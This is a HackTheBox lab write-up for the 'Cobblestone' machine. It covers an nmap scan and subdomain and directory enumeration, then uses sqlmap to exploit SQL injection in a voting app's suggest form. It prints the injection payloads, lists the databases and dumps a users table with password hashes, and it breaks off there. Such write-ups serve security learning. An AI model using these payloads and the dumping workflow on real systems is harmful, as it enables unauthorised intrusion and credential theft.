# Cobblestone HackTheBox Writeup

## IP
- 10.10.11.81


## Initial Scan 
- ```nmap -sV -sC -oN nmap/cobble.nmap 10.10.11.81```

## Results: 

```
# Nmap 7.97 scan initiated Fri Aug 22 14:58:12 2025 as: nmap -sV -sC -oN nmap/cobble.nmap 10.10.11.81
Nmap scan report for 10.10.11.81
Host is up (0.029s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 50:ef:5f:db:82:03:36:51:27:6c:6b:a6:fc:3f:5a:9f (ECDSA)
|_  256 e2:1d:f3:e9:6a:ce:fb:e0:13:9b:07:91:28:38:ec:5d (ED25519)
80/tcp open  http    Apache httpd 2.4.62
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Did not follow redirect to http://cobblestone.htb/
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Aug 22 14:58:21 2025 -- 1 IP address (1 host up) scanned in 8.57 seconds
```

## Finding
- openssh
- http service (resoveds to ```cobblestone.htb```)

## (Forgot about but) Subdomain discovery
- ```deploy.cobblestone.htb```
- ```vote.cobblestone.htb```

### Add to my hosts file
- ```echo "10.129.x.x cobblestone.htb deploy.cobblestone.htb vote.cobblestone.htb" >> /etc/hosts```

## Webb app enumeration
- direction is ```deploy.cobblestone.htb```
- ```feroxbuster -u http://deploy.cobblestone.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,js,json,txt,log -t 50 -e```
- also ```feroxbuster -u http://vote.cobblestone.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,js,json,txt,log -t 50 -e```


## Exploit 
- voting application allows user registration and login functionality
- creating an account and logging in, we can access the voting interface
- and there is just a basic table
- The application has a "suggest" feature that accepts user input
- intercept this with burp
```
POST /suggest.php HTTP/1.1
Host: vote.cobblestone.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 16
Origin: http://vote.cobblestone.htb
Connection: keep-alive
Referer: http://vote.cobblestone.htb/index.php
Cookie: PHPSESSID=9f734bt016qilo828ppja97mlp
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1
Priority: u=0, i
```

## SQL Exploit
```sqlmap -r req --batch```

```
python sqlmap.py -r req 
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.9.8.8#dev}
|_ -| . [)]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:30:16 /2025-08-22/

[16:30:16] [INFO] parsing HTTP request from 'req'
[16:30:16] [INFO] testing connection to the target URL
got a 302 redirect to 'http://vote.cobblestone.htb/details.php?id=4'. Do you want to follow? [Y/n] y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] y
[16:30:23] [INFO] checking if the target is protected by some kind of WAF/IPS
[16:30:23] [INFO] testing if the target URL content is stable
[16:30:24] [WARNING] POST parameter 'url' does not appear to be dynamic
[16:30:24] [WARNING] heuristic (basic) test shows that POST parameter 'url' might not be injectable
[16:30:24] [INFO] testing for SQL injection on POST parameter 'url'
[16:30:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[16:30:24] [WARNING] reflective value(s) found and filtering out
[16:30:25] [INFO] POST parameter 'url' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[16:30:27] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[16:30:32] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[16:30:32] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[16:30:32] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[16:30:32] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[16:30:33] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[16:30:33] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[16:30:33] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[16:30:33] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[16:30:33] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[16:30:33] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[16:30:33] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[16:30:33] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[16:30:33] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[16:30:33] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[16:30:33] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[16:30:34] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[16:30:34] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[16:30:34] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[16:30:34] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[16:30:34] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[16:30:34] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[16:30:34] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[16:30:34] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[16:30:34] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[16:30:34] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[16:30:34] [INFO] testing 'Generic inline queries'
[16:30:34] [INFO] testing 'MySQL inline queries'
[16:30:34] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[16:30:34] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[16:30:34] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[16:30:34] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[16:30:34] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[16:30:35] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[16:30:35] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[16:30:45] [INFO] POST parameter 'url' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[16:30:45] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[16:30:45] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[16:30:45] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[16:30:45] [INFO] target URL appears to have 5 columns in query
[16:30:47] [INFO] POST parameter 'url' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'url' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 80 HTTP(s) requests:
---
Parameter: url (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: url=cobblestone.htb' AND 6498=6498 AND 'kXeB'='kXeB

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: url=cobblestone.htb' AND (SELECT 7662 FROM (SELECT(SLEEP(5)))bgar) AND 'zhWm'='zhWm

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: url=-6357' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716a766a71,0x6a73435468644d4e77557753514f674d63435274495471415949714e466552705451644f5364614f,0x7162717871),NULL-- -
---
[16:30:51] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[16:30:52] [INFO] fetched data logged to text files under '/home/lily/.local/share/sqlmap/output/vote.cobblestone.htb'

[*] ending @ 16:30:52 /2025-08-22/
```

## Now doing a check for other databases
``` python sqlmap.py -r req --batch --dbs```
```
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.8.8#dev}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:32:26 /2025-08-22/

[16:32:26] [INFO] parsing HTTP request from 'req'
[16:32:26] [INFO] resuming back-end DBMS 'mysql' 
[16:32:26] [INFO] testing connection to the target URL
got a 302 redirect to 'http://vote.cobblestone.htb/details.php?id=90'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: url (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: url=cobblestone.htb' AND 6498=6498 AND 'kXeB'='kXeB

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: url=cobblestone.htb' AND (SELECT 7662 FROM (SELECT(SLEEP(5)))bgar) AND 'zhWm'='zhWm

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: url=-6357' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716a766a71,0x6a73435468644d4e77557753514f674d63435274495471415949714e466552705451644f5364614f,0x7162717871),NULL-- -
---
[16:32:26] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[16:32:26] [INFO] fetching database names
available databases [2]:
[*] information_schema
[*] vote

[16:32:26] [INFO] fetched data logged to text files under '/home/lily/.local/share/sqlmap/output/vote.cobblestone.htb'

[*] ending @ 16:32:26 /2025-08-22/
```

## Was trying different commands and got this
```
python sqlmap.py -r req --batch -D vote -T users --dump --no-cast
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.8.8#dev}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:34:58 /2025-08-22/

[16:34:58] [INFO] parsing HTTP request from 'req'
[16:34:58] [INFO] resuming back-end DBMS 'mysql' 
[16:34:58] [INFO] testing connection to the target URL
got a 302 redirect to 'http://vote.cobblestone.htb/details.php?id=96'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: url (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: url=cobblestone.htb' AND 6498=6498 AND 'kXeB'='kXeB

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: url=cobblestone.htb' AND (SELECT 7662 FROM (SELECT(SLEEP(5)))bgar) AND 'zhWm'='zhWm

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: url=-6357' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716a766a71,0x6a73435468644d4e77557753514f674d63435274495471415949714e466552705451644f5364614f,0x7162717871),NULL-- -
---
[16:34:59] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[16:34:59] [INFO] fetching columns for table 'users' in database 'vote'
[16:34:59] [INFO] fetching entries for table 'users' in database 'vote'
Database: vote
Table: users
[2 entries]
+----+------------------------+----------+--------------------------------------------------------------+----------+-----------+
| id | Email                  | LastName | Password                                                     | Username | FirstName |
+----+------------------------+----------+--------------------------------------------------------------+----------+-----------+
| 1  | cobble@cobblestone.htb |          | $2y$10$6XMWgf8RN6McVqmRyFIDb.6nNALRsA./u4HAF2GIBs3xgZXvZjv86 | admin    | Admin     |
| 10 | 123@123.com            | 123      | $2y$10$8oeGawnsrz/AQcKS6CecROQNA9YxgkVOJM937/DwRVs.e9sMqoGGG | test123  | 123       |
+----+------------------------+----------+--------------------------------------------------------------+----------+-----------+

[16:34:59] [INFO] table 'vote.users' dumped to CSV file '/home/lily/.local/share/sqlmap/output/vote.cobblestone.htb/dump/vote/users.csv'
[16:34:59] [INFO] fetched data logged to text files under '/home/lily/.local/share/sqlmap/output/vote.cobblestone.htb'

[*] ending @ 16:34:59 /2025-08-22/

```